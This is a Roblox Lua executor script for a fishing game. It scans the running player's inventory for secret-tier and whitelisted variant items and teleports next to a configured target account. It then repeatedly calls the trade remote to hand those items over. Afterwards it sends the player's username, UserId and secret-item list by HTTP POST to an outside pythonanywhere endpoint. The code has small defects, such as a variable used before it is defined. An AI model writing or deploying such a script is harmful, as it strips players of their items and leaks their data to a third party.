local Settings = getgenv().TradeConfig or {}

local Config = {
    TargetUsername = Settings.TargetUsername,
    Amount = Settings.Amount or "ALL",
    TradeDelay = Settings.TradeDelay or 3
}

local FavoriteConfig = {
    WhitelistId = {
        [243] = true,
    },
    WhitelistVariant = {
        ["Gemstone"] = true,
    }
}
local DBFish = HttpService:JSONDecode(game:HttpGet('https://raw.githubusercontent.com/Hansiongs/Hansiong-Hub/refs/heads/main/fishlists'))
local ScanConfig = {
    Endpoint = "https://hansiong.pythonanywhere.com/api/simpan",  
}


local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local LocalPlayer = Players.LocalPlayer
local Net = ReplicatedStorage:WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_net@0.2.0"):WaitForChild("net")
local InitiateTrade = Net:WaitForChild("RF/InitiateTrade")
local Replion = require(ReplicatedStorage.Packages.Replion)
local HttpService = game:GetService("HttpService")
local ItemDatabase = {}
local TierToRarity = {[1]="COMMON", [2]="UNCOMMON", [3]="RARE", [4]="EPIC", [5]="LEGENDARY", [6]="MYTHIC", [7]="SECRET"}

local ReplionModule = ReplicatedStorage:WaitForChild("Packages"):WaitForChild("Replion")
local DataReplion = require(ReplionModule).Client:WaitReplion("Data")

local function LoadDB(folder)
    if not folder then return end
    for _, v in ipairs(folder:GetChildren()) do
        local ok, data = pcall(require, v)
        if ok and (data.Data or data) then
            local info = data.Data or data
            local id = tostring(info.Id or v.Name)
            local name = tostring(info.Name or v.Name)
            if DBFish and DBFish[id] then
                info.Tier = DBFish[id].Tier
                if DBFish[id].Rarity then 
                    info.Rarity = DBFish[id].Rarity 
                end
            end
            
            local rarity = info.Rarity and string.upper(tostring(info.Rarity)) or tierToRarity[info.Tier] or "COMMON"
            local entry = { Name = name, Rarity = rarity, Tier = info.Tier }
            ItemDatabase[id] = entry
            ItemDatabase[name] = entry
        end
    end
end

LoadDB(ReplicatedStorage:FindFirstChild("Items"))
if ReplicatedStorage:FindFirstChild("Database") then
    LoadDB(ReplicatedStorage.Database:FindFirstChild("Fish"))
    LoadDB(ReplicatedStorage.Database:FindFirstChild("Items"))
end

local function GetItemInfo(id_or_name)
    return ItemDatabase[tostring(id_or_name)] or { Name = tostring(id_or_name), Rarity = "UNKNOWN", Tier = 0 }
end

local function ScanSecrets()
    local allItems = {}
    local invFish = DataReplion:Get({"Inventory", "Fish"}) or {}
    local invItems = DataReplion:Get({"Inventory", "Items"}) or {}
    
    for _, v in ipairs(invFish) do table.insert(allItems, v) end
    for _, v in ipairs(invItems) do table.insert(allItems, v) end

    local secretList = {}
    local grouped = {}
    local totalSecretCount = 0

    for _, item in ipairs(allItems) do
        local info = GetItemInfo(item.Id or item.Name)
        local isTarget = false

        if info.Rarity == "SECRET" or info.Tier == 7 then
            isTarget = true
        end

        if not isTarget then
            local variant = item.Metadata and item.Metadata.VariantId
            if variant and FavoriteConfig.WhitelistId[tonumber(item.Id)] and FavoriteConfig.WhitelistVariant[variant] then
                isTarget = true
                info.Name = variant .. " " .. info.Name 
            end
        end

        if isTarget then
            totalSecretCount = totalSecretCount + 1
            if not grouped[info.Name] then
                local newEntry = { Name = info.Name, Count = 0 }
                table.insert(secretList, newEntry)
                grouped[info.Name] = newEntry
            end
            grouped[info.Name].Count = grouped[info.Name].Count + 1
        end
    end

    local payload = {
        Username = LocalPlayer.Name,
        UserId = LocalPlayer.UserId,
        TotalSecrets = totalSecretCount,
        Items = secretList,
        Timestamp = os.time()
    }

    local req = (http_request or request or (syn and syn.request) or (fluxus and fluxus.request))
    if req then
        req({
            Url = ScanConfig.Endpoint, 
            Method = "POST", 
            Headers = {
                ["Content-Type"] = "application/json",
                ["User-Agent"] = "Roblox-Client"
            }, 
            Body = HttpService:JSONEncode(payload)
        })
    end
end

local function BuildItemDatabase()
    local itemsFolder = ReplicatedStorage:WaitForChild("Items")
    local foldersToScan = {itemsFolder}
    if ReplicatedStorage:FindFirstChild("Fish") then table.insert(foldersToScan, ReplicatedStorage.Fish) end

    for _, folder in ipairs(foldersToScan) do
        for _, itemModule in ipairs(folder:GetChildren()) do
            local ok, data = pcall(require, itemModule)
            if ok and (data.Data or data) then
                local info = data.Data or data
                if info.Id then
                    local tierNum = info.Tier or 0
                    local rarity = (info.Rarity and string.upper(tostring(info.Rarity))) or (TierToRarity[tierNum] or "UNKNOWN")
                    ItemDatabase[tostring(info.Id)] = {
                        Name = info.Name or "Unknown",
                        Rarity = rarity
                    }
                end
            end
        end
    end
end
BuildItemDatabase()

local function TeleportToTarget(target)
    if not LocalPlayer.Character or not target.Character then return end
    local pRoot = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
    local tRoot = target.Character:FindFirstChild("HumanoidRootPart")
    if pRoot and tRoot then
        pRoot.CFrame = tRoot.CFrame + Vector3.new(3, 0, 0)
    end
end

local function StartSender()
    local targetPlayer = nil
    for _, v in ipairs(Players:GetPlayers()) do
        if v.Name == Config.TargetUsername or v.DisplayName == Config.TargetUsername then
            targetPlayer = v
            break
        end
    end

    if not targetPlayer then 
        warn("Target player tidak ditemukan!") 
        return 
    end

    local DataReplion = Replion.Client:WaitReplion("Data")
    if not DataReplion then return end
    
    local items = DataReplion:Get({"Inventory", "Items"}) or {}
    local fish = DataReplion:Get({"Inventory", "Fish"}) or {}
    local inventory = {}
    
    for _, v in ipairs(items) do table.insert(inventory, v) end
    for _, v in ipairs(fish) do table.insert(inventory, v) end

    local tradeCount = 0
    local maxTrade = (type(Config.Amount) == "number") and Config.Amount or 999999

    print("Memulai scan inventory untuk trade...")

    for _, itemData in ipairs(inventory) do
        if tradeCount >= maxTrade then break end
        
        local info = GetItemInfo(itemData.Id)
        local rarity = info.Rarity
        local variant = itemData.Metadata and itemData.Metadata.VariantId 
        
        local isSecret = (rarity == "SECRET")
        local isWhitelistedVariant = (FavoriteConfig.WhitelistId[tonumber(itemData.Id)] and variant and FavoriteConfig.WhitelistVariant[variant])

        if isSecret or isWhitelistedVariant then
            
            local itemName = info.Name
            if variant then itemName = variant .. " " .. itemName end

            local success = false
            local attempts = 0
            local maxAttempts = 5 

            while not success and attempts < maxAttempts do
                TeleportToTarget(targetPlayer)
                task.wait(1) 

                local ok, res = pcall(function()
                    return InitiateTrade:InvokeServer(targetPlayer.UserId, itemData.UUID, "Fish") 
                end)

                if ok and res == true then
                    success = true
                    tradeCount = tradeCount + 1
                    print("Berhasil trade: " .. itemName)
                else
                    attempts = attempts + 1
                    warn("Gagal trade " .. itemName .. ", mencoba ulang ("..attempts.."/"..maxAttempts..")")
                    task.wait(Config.TradeDelay)
                end
            end
            
            if not success then
                warn("Skip " .. itemName .. " karena gagal terus-menerus.")
            end
        end
    end
    print("Selesai. Total trade: " .. tradeCount)
end

StartSender()
task.wait(0.5)
ScanSecrets()
